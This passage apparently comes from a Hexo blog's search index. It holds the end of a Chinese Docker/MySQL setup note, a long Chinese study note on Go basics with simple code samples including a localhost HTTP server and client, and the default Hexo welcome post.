class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713175546939.png"></p><p>输入密码root1234后，即进入mysql：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713175625028.png"></p></li><li><p>如查询有哪些数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210713175740448.png"></p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>获取镜像</li><li>运行带有该镜像的容器</li><li>进入容器运行服务</li></ol><p>附docker常用命令：</p><blockquote><p><a href="https://www.huaweicloud.com/articles/1995d352dd7228cac90cd8737f1f5c97.html">https://www.huaweicloud.com/articles/1995d352dd7228cac90cd8737f1f5c97.html</a></p></blockquote><p>输入以下命令查看容器的报错日志：</p><p><code>docker logs -f 容器id号</code></p><p>注：在window中mysql容器是跑在virtualbox上的，所以ip地址不是127.0.0.1而是通过cmd输入：</p><p><code>docker-machine ip default</code></p><p>查看mysql容器ip地址</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> Mysql </tag>
            
            <tag> gorm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go基础笔记</title>
      <link href="/2021/07/14/go_jichu/"/>
      <url>/2021/07/14/go_jichu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基础类型"><a href="#1-基础类型" class="headerlink" title="1.基础类型"></a>1.基础类型</h2><ol><li><p>打印字符必须使用printf，因为println会输出字符的ascii码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Printf(<span class="string">&quot;ch1 = %c, ch2 = %c, %d\n&quot;</span>, ch1, ch2, ch3)</span><br></pre></td></tr></table></figure></li><li><p>字符串是双引号，字符是单引号</p></li><li><blockquote><p>自动推导类型有两种写法</p><ol><li>var  a = 1</li><li>a := 1</li></ol></blockquote></li><li><p>%v自动匹配格式输出，但是并不是很只能比如字符型会输出其ascii码</p></li><li><p>_为匿名变量，一般用于丢弃某个函数返回值</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//每个程序都要有一个main包，没有main包则会导致build无法生成exe文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  fmt.Println(<span class="string">&quot;hello go!!!&quot;</span>)</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">10</span></span><br><span class="line">  <span class="comment">//a := 10</span></span><br><span class="line">  b := <span class="number">20</span></span><br><span class="line">  c := <span class="number">30</span></span><br><span class="line">  fmt.Println(<span class="string">&quot;a=&quot;</span>, a)</span><br><span class="line">  fmt.Printf(<span class="string">&quot;the type of a is %T\n&quot;</span>, a)</span><br><span class="line">  fmt.Printf(<span class="string">&quot;a=%d,b=%d,c=%d&quot;</span>, a, b, c)</span><br><span class="line">  <span class="keyword">const</span> i = <span class="number">10</span></span><br><span class="line">  fmt.Printf(<span class="string">&quot;the type of i is %T \n&quot;</span>, i)</span><br><span class="line">  <span class="keyword">var</span> ch1, ch2, ch3 <span class="keyword">byte</span></span><br><span class="line">  ch1 = <span class="string">&#x27;a&#x27;</span> <span class="comment">//字符赋值</span></span><br><span class="line">  ch2 = <span class="number">97</span>  <span class="comment">//字符的ascii码赋值</span></span><br><span class="line">  ch3 = <span class="string">&#x27;\n&#x27;</span> <span class="comment">//转义字符</span></span><br><span class="line">  fmt.Printf(<span class="string">&quot;ch1 = %c, ch2 = %c, %d\n&quot;</span>, ch1, ch2, ch3)</span><br><span class="line">  fmt.Println(<span class="string">&quot;ch1 = &quot;</span>,ch1)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-流程控制"><a href="#2-流程控制" class="headerlink" title="2.流程控制"></a>2.流程控制</h2><ol><li><p>if和左大括号要在同一行</p></li><li><p>支持一个初始化表达式, 初始化字句和条件表达式直接需要用分号分隔</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> b := <span class="number">3</span>; b == <span class="number">3</span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">&quot;b==3&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>switch不用写break来跳出循环，go语言自动包含</p></li><li><p>如果不想在执行了switch的case语句后跳出switch，则用fallthrough关键字</p></li><li><p>switch也支持一个初始化语句</p></li><li><p>switch有三种写法，见word</p></li><li><p>for 初始化条件；判断条件；条件变化{}</p></li><li><p>go语言只有i++没有++i</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">代码块....</span><br><span class="line">&#125;<span class="comment">//这种没有条件的则会无限循环</span></span><br></pre></td></tr></table></figure></li><li><p>range迭代函数返回值为两个，一个是下标，另一个是下标所对应元素</p></li></ol><h2 id="3-函数"><a href="#3-函数" class="headerlink" title="3.函数"></a>3.函数</h2><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210621162926530.png"></p><hr><ol><li><p>自定义函数放在main前main后都可以</p></li><li><p>函数的参数不需要写var关键字</p></li><li><p>如果形参为同类型则可以有简化写法，eg：a,b int （不推荐这种写法，会很乱）</p></li><li><p>如果不知道函数传入参数个数，则用不定参数 eg:(args …int)，其中args由切片实现，要访问传入的参数可以用arg[0],arg[1]…….</p></li><li><p>不定参数要写在形参的最后面</p></li><li><p><strong>注意函数定义最常用写法，word22页</strong></p></li><li><p>函数定义分类：</p><blockquote><p>6.1有参无返回值型</p><p>​    6.1.1固定参数</p><p>​    6.1.2不定参数</p><p>6.2无参有返回值型</p><p>​    6.2.1有一个返回值</p><p>​    6.2.2有n个返回值</p><p>6.3有参有返回值型</p></blockquote></li><li><p>如何函数的返回值是int型，则可以直接可以用+运算</p></li><li><p>函数其实也是一种数据类型即函数类型</p></li><li><p>利用函数类型实现计算器函数，即实现多态（一个接口，但其有多种形态）课p52</p></li><li><p>匿名函数是写在main内的，其可以调用main中的全局变量</p></li><li><p>匿名函数内部改外部变量，则外部变量相应改变</p></li><li><p>多个defer时从后向前执行</p></li><li><p>注意局部变量的作用范围：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag := <span class="number">3</span>;flag == <span class="number">3</span>&#123;</span><br><span class="line"></span><br><span class="line">fmt.<span class="built_in">println</span>(<span class="string">&quot;flag = &quot;</span>,flag)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="number">4</span><span class="comment">//err,因为flag的作用范围只有if语句里面，是一个局部变量</span></span><br></pre></td></tr></table></figure></li><li><p>执行到定义局部变量那句话时才会给其分配空间，当程序执行到离开作用域时，空间就被释放   </p></li><li><p>当使用变量时，采用就近原则，即采用当前作用域变量，如果未定义就用全局的那个</p></li></ol><h2 id="4-工程管理"><a href="#4-工程管理" class="headerlink" title="4.工程管理"></a>4.工程管理</h2><ol><li>一个包是由很多go文件组成，比如go/src/fmt</li><li>import . “fmt”这样导入则后续代码不需要写fmt前缀</li><li>同一个目录包名必须一样，参照src/fmt，注：fmt就是一个包</li><li>同一个目录，调用别的文件的函数，直接调用即可，无需包名引用</li><li>一个包即一个工程即一个文件夹</li><li>一个包内的不同go文件就是实现这个工程的不同功能模块</li><li>当在进行一个工程之前，先设置GOPATH为该工程的src路径</li><li>函数想被其他包调用则要将函数名首字母大写</li><li><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210622200918342.png"></li></ol><h2 id="5-复合类型"><a href="#5-复合类型" class="headerlink" title="5.复合类型"></a>5.复合类型</h2><ol><li><p>&amp;a与%p对应，不是%d</p></li><li><p>p=new(T),new函数就是在内存中拿出一个T类型的内存空间，然后将该内存空间的地址赋给p</p></li><li><p>注意数组的初始化形式</p></li><li><p>如果种子参数一样，则每次运行程序产生的随机数都一样</p></li><li><p>可以将种子参数设置为当地时间，这样每次执行程序种子不同从而随机数也会  不同</p></li><li><p>数组传入到函数只是传值，普通类型变量也一样都只是传值，函数内对该变量的操作不会影响函数外的该变量。要想改变则必须传地址</p></li><li><p>s := a[0:3:5]，s为切片，长度为3，容量为5</p></li><li><p>切片的初始化定义方式有如下几种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s1 := []<span class="keyword">int</span>&#123;&#125;<span class="comment">//len=0,cap=0 也可以是s1:=[]int&#123;1,2,3,4&#125;</span></span><br><span class="line">s4 := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">//第一个0是切片长度，第二个0为容量，若没指定容量则容量与长度相等</span></span><br></pre></td></tr></table></figure></li><li><p>通过append函数给slice加元素</p></li><li><p>s := a[0:3]，在进行切片时如果没有指定max则max默认为len(5)，注意不要和8混淆</p></li><li><p>切片并不是数组或数组指针，它通过内部指针和相关属性引⽤数组⽚段</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/image-20210624184541990.png"></p><p>改变切片值原数组值也会改变，改变数组值那么切片值也会相应改变</p></li><li><p>不管是哪一种切片，最终切片的指针都指向底层数组！！！</p></li><li><p>总结：对切片的操作会影响底层数组</p></li><li><p>切片传入到函数是传引用，函数内对其进行改变，函数外的相应也会改变</p></li><li><p>在使用多个scanf时，前面的scanf要加\n</p></li><li><p>map作为函数参数传递的是引用，即函数内部对其改变，函数外部该值也会做出相应改变</p></li><li><p>结构体的定义写在main函数外部</p></li><li><p>在定义了结构体指针p1后可以通过.运算符直接操作成员。eg:p1.sex即不用*p1.sex</p></li><li><p>如果想使用其他包的函数，结构体类型，结构体成员，函数名，类型名，结构体成员变量名，首字母必须大写。如果首字母是小写，只能在同一个包里使用</p></li></ol><h2 id="6-面向对象"><a href="#6-面向对象" class="headerlink" title="6. 面向对象"></a>6. 面向对象</h2><ol><li><p>方法：给<strong>自定义类型</strong>定义一种方法 </p></li><li><p>不同类型可以拥有同名方法</p></li><li><p>接收者可以类比为对象中的类，即给类添加方法</p></li><li><p>继承某一个结构体，其方法也能够被继承 </p></li><li><p>string，*p，struct都属于接口类型，可以定义一个接口类型的切片将这三个存入</p></li><li><p>如果用户定义的类型实现了某个接口类型声明的一组方法，那么这个用户定义的类型的值就可以赋给这个接口类型的值</p></li><li><p>空接口为万能类型，可以保存任意类型的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="string">&quot;abc&quot;</span> </span><br></pre></td></tr></table></figure></li></ol><h2 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7.异常处理"></a>7.异常处理</h2><ol><li><p>接口类型即万能类型，什么都可以存</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.<span class="built_in">println</span>(<span class="built_in">recover</span>())<span class="comment">//功能是出现panic时并不会让程序中断，并打印panic错误信息</span></span><br></pre></td></tr></table></figure></li><li><p>error是报错但不崩溃，panic是报错并崩溃程序 </p></li><li><p>recover()返回值为panic的错误信息</p></li></ol><h2 id="8-文本文件处理"><a href="#8-文本文件处理" class="headerlink" title="8.文本文件处理"></a>8.文本文件处理</h2><ol><li><p>常用字符串处理函数</p></li><li><p>结构体想要生成json，成员变量名首字母必须大写</p></li><li><p>如果想要json中的值首字母小写，要在比如结构体定义的后面加上’ json:”company” ‘其中’为反引号</p></li><li><p>利用’ json:”-“ ‘表示此字段不会输出到屏幕</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用make创建切片和map</span></span><br><span class="line">slice=<span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>,<span class="number">100</span>)<span class="comment">//len=0,cap=100</span></span><br><span class="line">map1=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;,<span class="number">4</span>)<span class="comment">//创建一个键为字符串型，值为任何类型且长度为4的字典</span></span><br></pre></td></tr></table></figure></li><li><p>json后返回的结果为字符列表，要通过string(result)转换为json格式</p></li><li><p>json需要先转换成[]byte，才能反转为结构体或者map</p></li><li><p>空接口类型值如何赋值给string等类型，看（中）p56</p></li><li><p>json解析到结构体更加简单，因为解析完之后每个字段什么类型很清楚的被定义了。而对于解析到map类型，其值全是空接口，要通过类型断言判断每个值的类型以及赋值给字符串</p></li><li><p>fmt.println()相当于os.stdout.WriteString()</p></li><li><p>Sprintf() 是把格式化字符串输出到指定的字符串中，可以用一个变量来接受，然后在打印</p></li><li><p>当文件读取完时err=io.EOF</p></li><li><p>注意file.read返回值有两个一个是读取长度n,一个是err</p></li></ol><h2 id="9-并发编程"><a href="#9-并发编程" class="headerlink" title="9.并发编程"></a>9.并发编程</h2><ol><li><p>主协程退出，其他子协程也要跟着退出</p></li><li><p>main函数即主协程</p></li><li><p>设置核数越多，时间片就越短</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.无缓冲型channel特点：</span><br><span class="line">写入的时候对方未读就会阻塞任务</span><br><span class="line">读的时候没有数据也会阻塞</span><br><span class="line">即要保证数据放入时被立即取出</span><br></pre></td></tr></table></figure></li><li><p>可通过range遍历channel内容</p></li><li><p>channel传参，是引用传递</p></li><li><p>双向管道传参可以变为单向</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">timer1 := time.NewTimer(time.Second * <span class="number">2</span>)<span class="comment">//timer1为定时器，三秒后定时器就会向自己的C字节管道发送一个time.Time类型的元素值</span></span><br><span class="line"><span class="comment">//timer1.Stop()停止计时器</span></span><br><span class="line"><span class="comment">//ok := timer1.Reset(1*time.Second)重置计时器1s后写入</span></span><br><span class="line">t2 := &lt;-timer1.C   <span class="comment">//定时器可实现延时功能，类似于sleep</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="10-HTTP编程"><a href="#10-HTTP编程" class="headerlink" title="10.HTTP编程"></a>10.HTTP编程</h2><ol><li><p>socket编程中write和read函数的传参都是字节切片，比如发送hello，即conn.write([]byte(“hello”))</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n, err :=conn.read(buf)<span class="comment">//接受来自对方发送的内容</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF&#123;</span><br><span class="line">fmt.<span class="built_in">println</span>(<span class="string">&quot;文件接收完毕&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.<span class="built_in">println</span>(<span class="string">&quot;err =&quot;</span>,err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">f.write(buf[:n])<span class="comment">//往文件写入内容 </span></span><br></pre></td></tr></table></figure></li><li><p>定义在main函数外部的为全局变量</p></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//服务器端代码示例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务端编写的业务逻辑处理程序myhandler</span></span><br><span class="line"><span class="comment">//w, 给客户端回复数据</span></span><br><span class="line"><span class="comment">//req为结构体, 读取客户端发送的数据，参数就是这两不能变</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/go&quot;</span>, myHandler)<span class="comment">// 请求127.0.0.1/go时调用myhandler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//在指定的地址进行监听，开启一个HTTP</span></span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;127.0.0.1:8000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">//客户端代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get方式请求一个资源</span></span><br><span class="line">    <span class="comment">//resp, err := http.Get(&quot;http://www.baidu.com&quot;)</span></span><br><span class="line">    <span class="comment">//resp, err := http.Get(&quot;http://www.neihan8.com/article/index.html&quot;)</span></span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:8000/go&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close() <span class="comment">//关闭</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;header = &quot;</span>, resp.Header)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;resp status %s\nstatusCode %d\n&quot;</span>, resp.Status, resp.StatusCode)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;body type = %T\n&quot;</span>, resp.Body)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//以下为读取服务器回应的主体数据部分，因为回应的主体数据部分是用resp.Body来获取，该接口是一个流所以要通过read的方式将其通过for循环一点一点的读入buf里面</span></span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">2048</span>) <span class="comment">//切片缓冲区</span></span><br><span class="line">    <span class="keyword">var</span> tmp <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        n, err := resp.Body.Read(buf) <span class="comment">//读取body包内容</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;读取内容结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        tmp += <span class="keyword">string</span>(buf[:n]) <span class="comment">//累加读取的内容</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;buf = &quot;</span>, <span class="keyword">string</span>(tmp))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> HTTP </tag>
            
            <tag> Socket </tag>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/05/13/hello-world/"/>
      <url>/2021/05/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
